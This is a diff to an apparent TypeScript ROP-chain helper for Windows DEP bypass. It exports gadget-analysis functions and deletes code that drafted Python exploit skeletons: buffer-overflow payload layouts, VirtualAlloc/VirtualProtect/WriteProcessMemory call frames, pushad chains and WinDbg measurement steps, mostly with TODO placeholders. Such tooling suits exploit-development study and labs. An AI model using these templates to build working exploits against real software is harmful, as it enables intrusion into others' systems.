@@ -107,7 +107,7 @@ export function liveAfter(jobs: Job[], index: number, withOwn = false): Role[] {
   return live;
 }
 
-function movesEsp(gadget: RopGadget): boolean {
+export function movesEsp(gadget: RopGadget): boolean {
   return gadget.categories.includes("STACK_PIVOT") || gadget.capabilities.some((capability) => capability.kind === "STACK_PIVOT");
 }
 
@@ -145,7 +145,7 @@ function pivotSource(gadget: RopGadget): string | undefined {
   return undefined;
 }
 
-type Ports = Partial<Record<Port, string>> & { offset?: number };
+export type Ports = Partial<Record<Port, string>> & { offset?: number };
 
 // The register each operand of the job's own instruction names.
 function ports(gadget: RopGadget, job: Job): Ports {
@@ -164,7 +164,7 @@ function ports(gadget: RopGadget, job: Job): Ports {
   return { dest: capability.register, source: capability.targetRegister };
 }
 
-function writtenRegisters(gadget: RopGadget): string[] {
+export function writtenRegisters(gadget: RopGadget): string[] {
   const summary = gadget.semanticSummary.summary;
   const written: string[] = [];
   for (const register of [...summary.writes.values.exact, ...summary.writes.values.conservative].map(String)) {
@@ -173,14 +173,14 @@ function writtenRegisters(gadget: RopGadget): string[] {
   return written;
 }
 
-function memoryWrites(gadget: RopGadget, own: string): string[] {
+export function memoryWrites(gadget: RopGadget, own: string): string[] {
   return gadget.instructions
     .filter((instruction) => instruction.mnemonic !== "push" && (instruction.operands[0] ?? "").indexOf("[") >= 0
       && instruction.normalizedText !== own)
     .map((instruction) => instruction.operands[0].trim());
 }
 
-function holds(gadget: RopGadget, dest: string, source: string): boolean {
+export function holds(gadget: RopGadget, dest: string, source: string): boolean {
   const transforms = gadget.semanticSummary.summary.registerTransforms as Record<string, { kind: string; base?: string; offset?: { kind: string; value?: number } }>;
   const transform = transforms[dest];
   return transform !== undefined && transform.kind === "affine" && transform.base === source
@@ -303,7 +303,7 @@ export function hex32(value: number): string {
   return `0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
 }
 
-function sequence(gadget: RopGadget): string {
+export function sequence(gadget: RopGadget): string {
   return gadget.instructions.map((instruction) => instruction.normalizedText).join(" ; ");
 }
 
@@ -347,169 +347,4 @@ export function planLines(plan: JobPlan): string[] {
   else lines.push(`    none of the ${verdicts.length} keeps ${live.map((entry) => entry.register).join(", ")}`);
   for (const verdict of after) lines.push(...line(verdict, " ", "usable"));
   return lines;
-}
-
-export type DraftInput = {
-  api: DepApi;
-  style: DepPlanStyle;
-  module: string;
-  iatSlot?: number;
-  writable?: number;
-  cave?: number;
-  picks: Record<string, Verdict | undefined>;
-  jmpEsp?: number;
-};
-
-function slotLine(name: string, value: number | undefined, how: string): string {
-  return value === undefined
-    ? `${name.padEnd(9)}= 0x????????   # TODO ${how}`
-    : `${name.padEnd(9)}= ${hex32(value)}   # ${how}`;
-}
-
-function gadgetLine(picks: Record<string, Verdict | undefined>, key: string, title: string): string {
-  const pick = picks[key];
-  if (!pick) return `rop += p32(0x????????)    # TODO ${title}: no candidate keeps the live registers`;
-  const line = `rop += p32(${hex32(gadgetAddress(pick.gadget))})    # ${title}: ${sequence(pick.gadget)}`;
-  return pick.move ? `# TODO move ${pick.move}\n${line}` : line;
-}
-
-const FRAME_DWORDS: Record<DepApi, number> = { VirtualAlloc: 6, VirtualProtect: 6, WriteProcessMemory: 7 };
-
-function measureLines(input: DraftInput): string[] {
-  const capture = input.picks.capture;
-  const at = capture ? hex32(gadgetAddress(capture.gadget)) : "<capture gadget>";
-  return [
-    "# TODO measure: distance from the captured ESP to field 1 of the frame",
-    `#   bp ${at} ; g ; r esp                      ESP here is the value push esp stores`,
-    "#   s -d esp-400 L100 45454545                    address of field 1 (the first dummy)",
-    "#   ? <field 1> - <captured ESP>                  negative: pop it into a register, then add",
-    "DIST_FIELD1 = ???",
-    "# TODO measure: distance from the captured ESP to the shellcode",
-    "#   s -b esp L2000 90 90 90 90                    start of the NOP sled",
-    "#   ? <sled> - <captured ESP>",
-    "DIST_SHELLCODE = ???",
-  ];
-}
-
-function skeletonFrame(api: DepApi): string[] {
-  if (api === "VirtualAlloc") {
-    return [
-      "frame  = p32(0x45454545)   # VirtualAlloc address   <- [IAT_SLOT]",
-      "frame += p32(0x46464646)   # return address         <- shellcode",
-      "frame += p32(0x47474747)   # lpAddress              <- shellcode",
-      "frame += p32(0x48484848)   # dwSize                 <- 0x1",
-      "frame += p32(0x49494949)   # flAllocationType       <- 0x1000",
-      "frame += p32(0x51515151)   # flProtect              <- 0x40",
-    ];
-  }
-  if (api === "VirtualProtect") {
-    return [
-      "frame  = p32(0x45454545)   # VirtualProtect address <- [IAT_SLOT]",
-      "frame += p32(0x46464646)   # return address         <- shellcode",
-      "frame += p32(0x47474747)   # lpAddress              <- shellcode",
-      "frame += p32(0x48484848)   # dwSize                 <- 0x201",
-      "frame += p32(0x49494949)   # flNewProtect           <- 0x40",
-      "frame += p32(WRITABLE)     # lpflOldProtect         literal when clean",
-    ];
-  }
-  return [
-    "frame  = p32(0x45454545)   # WriteProcessMemory     <- [IAT_SLOT]",
-    "frame += p32(CAVE)         # return address         literal when clean",
-    "frame += p32(0xFFFFFFFF)   # hProcess               literal",
-    "frame += p32(CAVE)         # lpBaseAddress          literal when clean",
-    "frame += p32(0x46464646)   # lpBuffer               <- shellcode",
-    "frame += p32(0x47474747)   # nSize                  <- 0x210",
-    "frame += p32(WRITABLE)     # lpNumberOfBytesWritten literal when clean",
-  ];
-}
-
-// The read gadget names the register the slot goes in, and how far from it the read lands.
-function slotLoad(read: Verdict | undefined): string {
-  const at = read?.at;
-  if (!at?.address) return "rop += p32(0x????????)    # TODO pop <reg> ; ret, followed by p32(IAT_SLOT) or its rop.construct recipe from [5/7]";
-  const target = at.offset ? `IAT_SLOT ${at.offset > 0 ? "-" : "+"} 0x${Math.abs(at.offset).toString(16)}` : "IAT_SLOT";
-  return `rop += p32(0x????????)    # TODO ${at.address} = ${target}: a pop, or the rop.construct recipe from [5/7] and a move`;
-}
-
-function writeNote(write: Verdict | undefined): string[] {
-  const at = write?.at;
-  return at?.address && at.offset ? [`# the write lands ${at.offset > 0 ? "+" : "-"}0x${Math.abs(at.offset).toString(16)} from ${at.address}: keep ${at.address} that far ${at.offset > 0 ? "before" : "after"} the field`] : [];
-}
-
-function skeletonChain(input: DraftInput): string[] {
-  const { picks } = input;
-  const patched = input.api === "WriteProcessMemory" ? "fields 1, 5 and 6" : input.api === "VirtualProtect" ? "fields 1 to 5" : "fields 1 to 6";
-  return [
-    'rop  = b""',
-    gadgetLine(picks, "capture", "capture ESP"),
-    "# captured ESP -> field 1: load DIST_FIELD1 with a pop, then",
-    gadgetLine(picks, "add", "add the distance"),
-    gadgetLine(picks, "copy", "keep the field address in its own register"),
-    "# field 1: the API address",
-    slotLoad(picks.read),
-    gadgetLine(picks, "read", "read the API address from the slot"),
-    ...writeNote(picks.write),
-    gadgetLine(picks, "write", "write it into the field"),
-    gadgetLine(picks, "advance", "advance to the next field, four times").replace(")    #", ") * 4  #"),
-    `# repeat load / write / advance for ${patched}, with the recipes from [5/7]`,
-    "# and the shellcode address = captured ESP + DIST_SHELLCODE",
-    "# move the working pointer back to field 1, then",
-    gadgetLine(picks, "pivot", "pivot ESP onto field 1"),
-  ];
-}
-
-function pushadChain(input: DraftInput): string[] {
-  const { picks } = input;
-  const slot = picks.read?.at.address ?? "eax";
-  const lines = [
-    'rop  = b""',
-    "# ESI = the API address: read the slot, then move it to ESI",
-    gadgetLine(picks, `pop_${slot}`, `pop ${slot}`),
-    "rop += p32(IAT_SLOT)",
-    gadgetLine(picks, "read", "read the slot"),
-    "rop += p32(0x????????)    # TODO mov esi, eax / xchg eax, esi (rop.query(\"capability\", \"MOVE_REGISTER\"))",
-    "# the other registers, in an order where no later gadget overwrites an earlier register:",
-    '#   dx @$osed().rop.setup("ebp=<jmp esp> ebx=... edx=... ecx=... edi=<ret> eax=0x90909090", "<bad chars>")',
-  ];
-  for (const register of ["ebp", "ebx", "edx", "ecx", "edi", "eax"]) {
-    lines.push(gadgetLine(picks, `pop_${register}`, `pop ${register}`), `rop += p32(0x????????)    # TODO value for ${register.toUpperCase()}, see the map in [6/7]`);
-  }
-  lines.push(gadgetLine(picks, "pushad", "pushad ; ret"));
-  if (input.jmpEsp !== undefined) lines.push(`# jmp esp for EBP: ${hex32(input.jmpEsp)}`);
-  return lines;
-}
-
-export function draftLines(input: DraftInput): string[] {
-  const head = [
-    "# DRAFT. Verify every field in WinDbg before you trust it. This is not a finished chain:",
-    "# the gadgets below are the [4/7] picks. Each keeps the registers the chain still needs,",
-    "# and a '# TODO move' line marks where a value has to change register first.",
-    "import struct",
-    "def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)",
-    "",
-    "OFFSET   = ???              # TODO measure: bytes from buffer start to EIP (pattern.create / pattern.offset)",
-    slotLine("IAT_SLOT", input.iatSlot, `IAT slot of ${input.api}`),
-  ];
-  if (input.api !== "VirtualAlloc") head.push(slotLine("WRITABLE", input.writable, "writable dword, from [5/7]"));
-  if (input.api === "WriteProcessMemory") head.push(slotLine("CAVE", input.cave, "executable code cave, from [5/7]"));
-  head.push("");
-
-  if (input.style === "pushad") {
-    return [...head, ...pushadChain(input), "", 'shellcode = b"\\x90" * 16 + b"..."', 'payload = b"A" * OFFSET + rop + shellcode'];
-  }
-  const frameBytes = FRAME_DWORDS[input.api] * 4;
-  return [
-    ...head,
-    ...measureLines(input),
-    "",
-    `# frame, ${FRAME_DWORDS[input.api]} dwords just before EIP (bp <first gadget> ; dd esp-${(frameBytes + 4).toString(16)} L${FRAME_DWORDS[input.api]})`,
-    ...skeletonFrame(input.api),
-    "",
-    ...skeletonChain(input),
-    "",
-    'shellcode = b"\\x90" * 16 + b"..."',
-    'payload  = b"A" * (OFFSET - len(frame)) + frame + rop',
-    'payload += b"C" * ???        # TODO measure: padding so the shellcode sits at captured ESP + DIST_SHELLCODE',
-    "payload += shellcode",
-  ];
 }
